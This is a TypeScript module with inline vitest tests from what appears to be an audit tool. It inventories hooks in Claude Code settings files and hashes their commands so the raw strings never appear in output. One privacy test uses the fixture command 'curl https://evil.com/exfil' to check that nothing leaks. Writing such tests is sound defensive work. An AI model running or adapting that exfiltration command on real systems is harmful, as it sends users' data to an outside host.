import { readFile, stat } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import path from 'node:path';
import { homedir } from 'node:os';
import type { InventoryItem } from './types.ts';

/**
 * Hook lifecycle events that inject their output into model context.
 * Each fire of an inject-capable hook costs up to 2500 tokens of context.
 *
 * Pure side-effect events (e.g. 'Notification') are intentionally excluded:
 * they run commands but their stdout is NOT fed back into the model.
 */
const INJECT_CAPABLE_EVENTS = new Set([
  'SessionStart',
  'UserPromptSubmit',
  'PreToolUse',
  'PostToolUse',
  'PreCompact',
  'PostCompact',
  'SessionEnd',
]);

/**
 * Privacy-critical: produce a stable 8-char hex hash of a raw command string.
 * NEVER expose the raw command in any output channel; only this hash leaves this module.
 *
 * Stable within a process call — same command produces the same hash, so users
 * can correlate ghost-table rows with their settings.json.
 */
function shortHash(command: string): string {
  return createHash('sha256').update(command).digest('hex').slice(0, 8);
}

/**
 * Read and JSON-parse a settings.json file.
 * Returns null if the file is missing, unreadable, or not valid JSON.
 */
async function readSettingsJson(
  filePath: string,
): Promise<{ parsed: unknown; mtimeMs: number } | null> {
  try {
    const s = await stat(filePath);
    const raw = await readFile(filePath, 'utf-8');
    const parsed: unknown = JSON.parse(raw);
    return { parsed, mtimeMs: s.mtimeMs };
  } catch {
    return null;
  }
}

/**
 * Extract InventoryItems from a parsed settings.json hooks section.
 *
 * Shape expected (per Claude Code docs):
 * {
 *   "hooks": {
 *     "SessionStart": [
 *       { "matcher": "optional", "hooks": [{ "type": "command", "command": "..." }] }
 *     ]
 *   }
 * }
 *
 * One InventoryItem per leaf hook command. Malformed shapes are silently skipped.
 * Raw command strings NEVER appear in the returned items (only shortHash).
 *
 * @param parsed       - Parsed settings.json content
 * @param mtimeMs      - Modification time of the settings file
 * @param settingsPath - Absolute path to the settings.json file (used as item.path)
 * @param scope        - 'global' or 'project'
 * @param projectPath  - Absolute project path for project-scoped hooks, null for global
 * @param verbose      - Emit debug warnings to stderr for invalid shapes
 */
function extractHookItems(
  parsed: unknown,
  mtimeMs: number,
  settingsPath: string,
  scope: 'global' | 'project',
  projectPath: string | null,
  verbose?: boolean,
): InventoryItem[] {
  const items: InventoryItem[] = [];

  // Require an object with a "hooks" key
  if (typeof parsed !== 'object' || parsed === null) return items;
  const root = parsed as Record<string, unknown>;
  const hooksField = root['hooks'];
  if (hooksField === undefined) return items; // no hooks configured — normal

  // hooks must be an object (event name → array of handler groups)
  if (typeof hooksField !== 'object' || hooksField === null || Array.isArray(hooksField)) {
    if (verbose) {
      console.error(
        `[ccaudit] scan-hooks: "hooks" field in ${settingsPath} is not an object — skipping`,
      );
    }
    return items;
  }

  const hooksObj = hooksField as Record<string, unknown>;

  for (const event of Object.keys(hooksObj)) {
    const eventHandlers = hooksObj[event];

    // Each event value must be an array of handler groups
    if (!Array.isArray(eventHandlers)) {
      if (verbose) {
        console.error(
          `[ccaudit] scan-hooks: hooks["${event}"] in ${settingsPath} is not an array — skipping event`,
        );
      }
      continue;
    }

    const injectCapable = INJECT_CAPABLE_EVENTS.has(event);

    for (const handlerGroup of eventHandlers) {
      if (typeof handlerGroup !== 'object' || handlerGroup === null) continue;
      const group = handlerGroup as Record<string, unknown>;

      const matcher = typeof group['matcher'] === 'string' ? group['matcher'] : undefined;
      const leafHooks = group['hooks'];

      if (!Array.isArray(leafHooks)) continue;

      for (const leaf of leafHooks) {
        if (typeof leaf !== 'object' || leaf === null) continue;
        const leafObj = leaf as Record<string, unknown>;

        // Accept 'command' (legacy) and 'mcp_tool' (cc 2.1.118+) leaf types;
        // future types are silently skipped (forward-compat — no log spam).
        const leafType = leafObj['type'];
        if (leafType !== 'command' && leafType !== 'mcp_tool') continue;

        // Privacy-critical: hash the identifier, never expose the raw string.
        // For mcp_tool, the canonical field per cc 2.1.118 is unconfirmed; accept
        // 'tool', 'tool_name', or 'name' (first string wins) defensively.
        let payload: string;
        if (leafType === 'command') {
          const command = leafObj['command'];
          if (typeof command !== 'string') continue;
          payload = command;
        } else {
          const tool = leafObj['tool'];
          const toolName = leafObj['tool_name'];
          const nameField = leafObj['name'];
          const candidate =
            typeof tool === 'string'
              ? tool
              : typeof toolName === 'string'
                ? toolName
                : typeof nameField === 'string'
                  ? nameField
                  : null;
          if (candidate === null) continue;
          payload = candidate;
        }
        const hash = shortHash(payload);

        // Build item name. Legacy command hooks keep the historical
        // event:matcher:hash format. mcp_tool hooks add a 'tool:' segment
        // to prevent collision with command hooks on the same event/matcher slot.
        const matcherPart = matcher ?? '*';
        const name =
          leafType === 'command'
            ? `${event}:${matcherPart}:${hash}`
            : `${event}:${matcherPart}:tool:${hash}`;

        items.push({
          name,
          path: settingsPath,
          scope,
          category: 'hook',
          projectPath,
          mtimeMs,
          hookEvent: event,
          injectCapable,
        });
      }
    }
  }

  return items;
}

/**
 * Scan global and project settings.json files for configured hooks.
 *
 * Read order (concatenate — show both, each item pointing to actual source file):
 * 1. Global legacy: ~/.claude/settings.json
 * 2. Global XDG:    ~/.config/claude/settings.json
 * 3. Per project:   {projPath}/.claude/settings.json
 * 4. Per project:   {projPath}/.claude/settings.local.json
 *
 * One InventoryItem is emitted per leaf hook (per command entry).
 * Raw command strings are NEVER emitted — only their 8-char SHA-256 hash.
 * Missing files are silently skipped (no error thrown).
 *
 * @param projectPaths      - Known project paths to scan for project-local settings
 * @param verbose           - Emit debug warnings for invalid hook shapes
 * @param globalSettingsPaths - Override the global settings paths (used in tests to avoid
 *                              reading real ~/.claude/settings.json)
 */
export async function scanHooks(
  projectPaths: string[],
  verbose?: boolean,
  globalSettingsPaths?: string[],
): Promise<InventoryItem[]> {
  const home = homedir();
  const items: InventoryItem[] = [];

  // Global settings files — use override if provided (for testing), otherwise default
  const resolvedGlobalPaths = globalSettingsPaths ?? [
    path.join(home, '.claude', 'settings.json'),
    path.join(home, '.config', 'claude', 'settings.json'),
  ];

  for (const settingsPath of resolvedGlobalPaths) {
    const result = await readSettingsJson(settingsPath);
    if (result === null) continue;
    items.push(
      ...extractHookItems(result.parsed, result.mtimeMs, settingsPath, 'global', null, verbose),
    );
  }

  // Project-local settings files
  for (const projPath of projectPaths) {
    const projectSettingsPaths = [
      path.join(projPath, '.claude', 'settings.json'),
      path.join(projPath, '.claude', 'settings.local.json'),
    ];
    for (const settingsPath of projectSettingsPaths) {
      const result = await readSettingsJson(settingsPath);
      if (result === null) continue;
      items.push(
        ...extractHookItems(
          result.parsed,
          result.mtimeMs,
          settingsPath,
          'project',
          projPath,
          verbose,
        ),
      );
    }
  }

  return items;
}

if (import.meta.vitest) {
  const { describe, it, expect, beforeEach, afterEach } = import.meta.vitest;
  const { mkdtemp, mkdir, writeFile, rm } = await import('node:fs/promises');
  const { tmpdir } = await import('node:os');

  /**
   * Privacy assertion helper: serialize item to JSON and confirm a
   * suspicious command substring never appears.
   */
  function noCommandLeak(items: InventoryItem[], sensitiveSubstring: string): boolean {
    const serialized = JSON.stringify(items);
    return !serialized.includes(sensitiveSubstring);
  }

  describe('shortHash (via privacy test)', () => {
    it('privacy: raw command string never appears in scan output', async () => {
      const dir = await mkdtemp(path.join(tmpdir(), 'scan-hooks-priv-'));
      try {
        const settingsPath = path.join(dir, 'settings.json');
        const sensitiveCommand = 'curl https://evil.com/exfil';
        await writeFile(
          settingsPath,
          JSON.stringify({
            hooks: {
              SessionStart: [{ hooks: [{ type: 'command', command: sensitiveCommand }] }],
            },
          }),
        );

        const items = await extractHookItemsFromFile(settingsPath, 'global', null);
        // The raw command must never appear in any field
        expect(noCommandLeak(items, sensitiveCommand)).toBe(true);
        expect(noCommandLeak(items, 'evil.com')).toBe(true);
        expect(noCommandLeak(items, 'exfil')).toBe(true);
        // But the item should still be emitted
        expect(items).toHaveLength(1);
        // Name should contain a short hash
        expect(items[0].name).toMatch(/^SessionStart:\*:[0-9a-f]{8}$/);
      } finally {
        await rm(dir, { recursive: true, force: true });
      }
    });
  });

  // Helper to test extractHookItems via a real file (avoids exposing internals)
  async function extractHookItemsFromFile(
    settingsPath: string,
    scope: 'global' | 'project',
    projectPath: string | null,
  ): Promise<InventoryItem[]> {
    const result = await readSettingsJson(settingsPath);
    if (!result) return [];
    return extractHookItems(result.parsed, result.mtimeMs, settingsPath, scope, projectPath);
  }

  describe('extractHookItems', () => {
    let tmpDir: string;

    beforeEach(async () => {
      tmpDir = await mkdtemp(path.join(tmpdir(), 'scan-hooks-'));
    });

    afterEach(async () => {
      await rm(tmpDir, { recursive: true, force: true });
    });

    it('3 events: SessionStart (inject, no matcher), PreToolUse (inject, matcher Bash), Notification (pure side-effect)', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            SessionStart: [{ hooks: [{ type: 'command', command: 'echo session-start' }] }],
            PreToolUse: [
              { matcher: 'Bash', hooks: [{ type: 'command', command: 'echo pre-tool' }] },
            ],
            Notification: [{ hooks: [{ type: 'command', command: 'echo notify' }] }],
          },
        }),
      );

      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toHaveLength(3);

      const sessionStart = items.find((i) => i.hookEvent === 'SessionStart');
      const preToolUse = items.find((i) => i.hookEvent === 'PreToolUse');
      const notification = items.find((i) => i.hookEvent === 'Notification');

      expect(sessionStart).toBeDefined();
      expect(sessionStart!.injectCapable).toBe(true);
      expect(sessionStart!.name).toMatch(/^SessionStart:\*:/);
      expect(sessionStart!.scope).toBe('global');

      expect(preToolUse).toBeDefined();
      expect(preToolUse!.injectCapable).toBe(true);
      expect(preToolUse!.name).toMatch(/^PreToolUse:Bash:/);

      expect(notification).toBeDefined();
      expect(notification!.injectCapable).toBe(false);
      expect(notification!.name).toMatch(/^Notification:\*:/);
    });

    it('missing settings.json → zero items, no error', async () => {
      const items = await extractHookItemsFromFile(
        path.join(tmpDir, 'nonexistent.json'),
        'global',
        null,
      );
      expect(items).toEqual([]);
    });

    it('malformed hooks field (not an object) → zero items, no crash', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(settingsPath, JSON.stringify({ hooks: 'invalid-string' }));
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toEqual([]);
    });

    it('missing hooks field → zero items (normal case)', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(settingsPath, JSON.stringify({ permissions: { defaultMode: 'plan' } }));
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toEqual([]);
    });

    it('non-array event value → skip that event, no crash', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            SessionStart: 'invalid',
            PostToolUse: [{ hooks: [{ type: 'command', command: 'echo post' }] }],
          },
        }),
      );
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      // SessionStart is skipped (invalid), PostToolUse is valid
      expect(items).toHaveLength(1);
      expect(items[0].hookEvent).toBe('PostToolUse');
    });

    it('non-string command → skip leaf', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            SessionStart: [{ hooks: [{ type: 'command', command: 123 }] }],
          },
        }),
      );
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toEqual([]);
    });

    it('non-object leaf → skip leaf', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            SessionStart: [{ hooks: ['invalid-string-leaf'] }],
          },
        }),
      );
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toEqual([]);
    });

    it('different command strings → different hashes → different items (no dedup)', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            SessionStart: [
              {
                matcher: 'Bash',
                hooks: [
                  { type: 'command', command: 'echo foo' },
                  { type: 'command', command: 'echo bar' },
                ],
              },
            ],
          },
        }),
      );
      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toHaveLength(2);
      expect(items[0].name).not.toBe(items[1].name);
    });

    it('project-scoped hook has scope=project and projectPath set', async () => {
      const projPath = path.join(tmpDir, 'my-project');
      const settingsPath = path.join(projPath, '.claude', 'settings.json');
      await mkdir(path.dirname(settingsPath), { recursive: true });
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            PostToolUse: [{ hooks: [{ type: 'command', command: 'echo project-hook' }] }],
          },
        }),
      );
      const items = await extractHookItemsFromFile(settingsPath, 'project', projPath);
      expect(items).toHaveLength(1);
      expect(items[0].scope).toBe('project');
      expect(items[0].projectPath).toBe(projPath);
    });
  });

  describe('mcp_tool support (cc 2.1.118+)', () => {
    let tmpDir: string;

    beforeEach(async () => {
      tmpDir = await mkdtemp(path.join(tmpdir(), 'scan-hooks-mcptool-'));
    });

    afterEach(async () => {
      await rm(tmpDir, { recursive: true, force: true });
    });

    it('mcp_tool leaf produces an InventoryItem with non-zero token estimate', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      const sensitiveTool = 'mcp__server__do_thing';
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            PreToolUse: [
              {
                matcher: 'Bash',
                hooks: [{ type: 'mcp_tool', tool: sensitiveTool }],
              },
            ],
          },
        }),
      );

      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toHaveLength(1);
      expect(items[0].hookEvent).toBe('PreToolUse');
      expect(items[0].injectCapable).toBe(true);
      expect(items[0].name).toMatch(/^PreToolUse:Bash:tool:[0-9a-f]{8}$/);
      // Privacy invariant: raw tool identifier never leaks
      expect(noCommandLeak(items, sensitiveTool)).toBe(true);

      // Token estimate flows through unchanged from existing hook estimator.
      const { estimateHookTokens } = await import('../token/hook-estimator.ts');
      const est = estimateHookTokens(items[0].injectCapable!, 0);
      expect(est.tokens).toBeGreaterThan(0);
    });

    it('mcp_tool name has type discriminator preventing collision with command on same event/matcher', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            PreToolUse: [
              {
                matcher: 'Bash',
                hooks: [
                  { type: 'command', command: 'echo hi' },
                  { type: 'mcp_tool', tool: 'mcp__srv__act' },
                ],
              },
            ],
          },
        }),
      );

      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toHaveLength(2);
      const names = items.map((i) => i.name);
      expect(new Set(names).size).toBe(2);
      // Command hook keeps legacy format (no 'tool:' segment).
      expect(names.some((n) => /^PreToolUse:Bash:[0-9a-f]{8}$/.test(n))).toBe(true);
      // mcp_tool hook gets the discriminator.
      expect(names.some((n) => /^PreToolUse:Bash:tool:[0-9a-f]{8}$/.test(n))).toBe(true);
    });

    it('mcp_tool accepts tool_name and name as fallback identifier fields', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            PostToolUse: [
              { hooks: [{ type: 'mcp_tool', tool_name: 'mcp__a__x' }] },
              { hooks: [{ type: 'mcp_tool', name: 'mcp__b__y' }] },
            ],
          },
        }),
      );

      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toHaveLength(2);
      for (const item of items) {
        expect(item.hookEvent).toBe('PostToolUse');
        expect(item.injectCapable).toBe(true);
        expect(item.name).toMatch(/^PostToolUse:\*:tool:[0-9a-f]{8}$/);
      }
    });

    it('mcp_tool leaf without identifier is silently skipped', async () => {
      const settingsPath = path.join(tmpDir, 'settings.json');
      await writeFile(
        settingsPath,
        JSON.stringify({
          hooks: {
            PreToolUse: [{ hooks: [{ type: 'mcp_tool' }] }],
          },
        }),
      );

      const items = await extractHookItemsFromFile(settingsPath, 'global', null);
      expect(items).toEqual([]);
    });
  });

  describe('scanHooks', () => {
    let tmpDir: string;

    beforeEach(async () => {
      tmpDir = await mkdtemp(path.join(tmpdir(), 'scan-hooks-int-'));
    });

    afterEach(async () => {
      await rm(tmpDir, { recursive: true, force: true });
    });

    it('no settings.json files anywhere → zero items, no error', async () => {
      const items = await scanHooks([]);
      // Global settings.json may or may not exist on this machine;
      // just verify the function doesn't throw regardless
      expect(Array.isArray(items)).toBe(true);
    });

    it('global + project both present → items from both scopes', async () => {
      // Create a fake project with its own settings.json
      const projPath = path.join(tmpDir, 'my-project');
      const claudeDir = path.join(projPath, '.claude');
      await mkdir(claudeDir, { recursive: true });

      await writeFile(
        path.join(claudeDir, 'settings.json'),
        JSON.stringify({
          hooks: {
            PostToolUse: [{ hooks: [{ type: 'command', command: 'echo project' }] }],
          },
        }),
      );
      await writeFile(
        path.join(claudeDir, 'settings.local.json'),
        JSON.stringify({
          hooks: {
            PreToolUse: [{ hooks: [{ type: 'command', command: 'echo local' }] }],
          },
        }),
      );

      const items = await scanHooks([projPath]);
      const projectItems = items.filter((i) => i.scope === 'project');
      // Should have one item from settings.json and one from settings.local.json
      expect(projectItems).toHaveLength(2);
      expect(projectItems.map((i) => i.hookEvent).sort()).toEqual(['PostToolUse', 'PreToolUse']);
      // Each item points to its actual source file
      const settingsItem = projectItems.find((i) => i.hookEvent === 'PostToolUse');
      const localItem = projectItems.find((i) => i.hookEvent === 'PreToolUse');
      expect(settingsItem!.path).toContain('settings.json');
      expect(localItem!.path).toContain('settings.local.json');
    });

    it('same command in global + project → two items, different scopes, same hash', async () => {
      // We cannot control the global settings.json, so we test via extractHookItems directly
      const dir1 = path.join(tmpDir, 'global');
      const dir2 = path.join(tmpDir, 'project');
      await mkdir(dir1, { recursive: true });
      await mkdir(dir2, { recursive: true });

      const sameCommand = 'echo same-command';
      const settings1 = path.join(dir1, 'settings.json');
      const settings2 = path.join(dir2, 'settings.json');
      const fixture = JSON.stringify({
        hooks: {
          SessionStart: [{ hooks: [{ type: 'command', command: sameCommand }] }],
        },
      });
      await writeFile(settings1, fixture);
      await writeFile(settings2, fixture);

      const result1 = await readSettingsJson(settings1);
      const result2 = await readSettingsJson(settings2);
      const items1 = result1
        ? extractHookItems(result1.parsed, result1.mtimeMs, settings1, 'global', null)
        : [];
      const items2 = result2
        ? extractHookItems(result2.parsed, result2.mtimeMs, settings2, 'project', tmpDir)
        : [];

      expect(items1).toHaveLength(1);
      expect(items2).toHaveLength(1);
      expect(items1[0].scope).toBe('global');
      expect(items2[0].scope).toBe('project');
      // Same command → same hash → same name
      expect(items1[0].name).toBe(items2[0].name);
    });
  });
}
